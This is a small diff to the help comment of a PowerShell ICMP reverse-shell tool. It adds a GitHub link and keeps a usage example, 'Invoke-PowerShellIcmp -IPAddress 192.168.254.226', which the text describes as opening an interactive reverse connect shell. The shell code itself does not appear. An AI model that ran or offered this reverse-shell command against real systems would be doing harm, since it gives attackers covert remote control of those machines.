@@ -28,7 +28,7 @@ PS > Invoke-PowerShellIcmp-IPAddress 192.168.254.226
 Above shows an example of an interactive PowerShell reverse connect shell. 
 
 .LINK
-
+https://github.com/ahhh/PSSE/blob/master/Invoke-ICMP-Shell.ps1
 #>           
     [CmdletBinding()] Param(
 
